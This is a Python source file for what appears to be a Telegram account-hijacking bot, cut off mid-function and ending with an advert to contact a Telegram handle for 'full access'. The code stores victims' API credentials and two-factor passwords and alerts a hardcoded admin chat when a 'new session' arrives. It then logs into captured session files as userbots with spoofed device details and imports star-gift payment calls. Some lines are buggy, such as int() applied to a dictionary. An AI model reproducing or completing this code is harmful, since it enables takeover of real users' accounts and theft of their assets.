import asyncio
import os
from datetime import datetime, timedelta
import random
import time
import json


from pyrogram import Client as Client
from pyrogram.raw.functions.payments import GetSavedStarGifts, GetStarsStatus
from pyrogram.raw.types import InputPeerSelf, InputSavedStarGiftUser, InputPeerUser
from pyrogram.raw.types import StarGiftUnique, StarGiftAttributeOriginalDetails, StarGiftAttributeModel, StarGiftAttributeBackdrop, StarGiftAttributePattern


from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile

from aiogram.enums import ParseMode
from aiogram.client.bot import DefaultBotProperties
from aiogram.filters import Command
from aiogram import F

from config import *

from threading import Thread
from app import app 


dp = Dispatcher()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))


active_clients = {}


def add_to_json(user_id: int, api_id: int, api_hash: str, password: str, config_id: int):
    if os.path.exists("session-data.json"):
        with open("session-data.json", "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = {}
    else:
        data = {}

    if str(user_id) not in data:
        data[str(user_id)] = {}

    data[str(user_id)]["api_id"] = str(api_id)
    data[str(user_id)]["api_hash"] = api_hash
    data[str(user_id)]["password"] = password
    data[str(user_id)]["config_id"] = str(config_id)

    with open("session-data.json", "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_json():
    if os.path.exists("session-data.json"):
        with open("session-data.json", "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                return data
            except json.JSONDecodeError:
                return {}
    else:
        return {}
    

async def get_client(user_id):
    client = active_clients.get(user_id)

    if client:
        return client 

    # Создаём новый клиент
    data = load_json()
    user_data = int(data.get(int(user_id), {}))
    config_id = int(user_data.get("config_id", 0))
    client = Client(f"sessions/userbot_{user_id}",
                    device_model=DEVICE_MODELS[config_id],
                    system_version=SYSTEM_VERSIONS[config_id],
                    app_version=APP_VERSIONS[config_id],
                    sleep_threshold=30,
                    no_updates=True,
                    lang_code="en")
    await client.start()
    active_clients[user_id] = client
    return client



async def notify_new_session(user_id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Перейти к сессии #{user_id}", callback_data=f"session:{user_id}")]
    ])
    await bot.send_message(chat_id=8151840164, text=f"""<b>📂 Новая сессия получена!</b>

<b>user_id: {user_id}</b>""", reply_markup=keyboard)
    return



async def ensure_peer(client, user_id: int):
    try:
        user = await client.get_users(user_id)
        return user.id
    except Exception as e:
        try:
            peer = await client.resolve_peer(user_id)
            return peer.user_id if hasattr(peer, "user_id") else peer.channel_id
        except Exception:
            print(f"Не удалось найти peer для user_id={user_id}: {e}")
            return None
    

@dp.message(F.text.startswith("/clear"))
async def clear_sessions(message: Message):
    folder = "sessions"
    if not os.path.exists(folder):
        print(f"Папка {folder} не существует")
        return

    for filename in os.listdir(folder):
        filepath = os.path.join(folder, filename)
        try:
            if os.path.isfile(filepath):
                os.remove(filepath)
                print(f"Удалён файл: {filepath}")
            elif os.path.isdir(filepath):
                print(f"Пропущена папка: {filepath}")
        except Exception as e:
            print(f"Не удалось удалить {filepath}: {e}")
    
    await message.answer("<b>✅ Все сессии удалены!</b>")


@dp.message(F.text.startswith("/start"))
async def start_command(message: types.Message):
    # Получаем список файлов сессий
    SESSIONS_DIR = "sessions"
    session_files = [f for f in os.listdir(SESSIONS_DIR) if os.path.isfile(os.path.join(SESSIONS_DIR, f))]

    if not session_files:
        await message.answer("📂 Сессии не найдены в папке 'sessions'.")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[])
    for session_file in session_files:
        if not session_file.endswith(".session"):
            continue
        session_name = os.path.splitext(session_file)[0]
        id = session_name.split('_')[1]
        kb.inline_keyboard.append([InlineKeyboardButton(text=session_name, callback_data=f"session:{id}")])

    await message.answer(
        "👋 Привет! Выбери сессию из списка ниже:",
        reply_markup=kb
    )


@dp.callback_query(F.data.startswith("session:"))
async def session_handler(callback: CallbackQuery):
    await callback.answer()

    id = callback.data.split(":")[1]

    if id not in active_clients:
        data = load_json()
        user_data = data.get(int(id), {})
        config_id = int(user_data.get("config_id", 0))
        client = Client(f"sessions/userbot_{id}", device_model=DEVICE_MODELS[config_id],
            system_version=SYSTEM_VERSIONS[config_id],
            app_version=APP_VERSIONS[config_id],
            sleep_threshold=30,
            no_updates=True,
            lang_code="en")
        await client.start()
        active_clients[id] = client
    else:
        client = await get_client(id)

    
@shimorra в телеграм - пишите для получения полного доступа


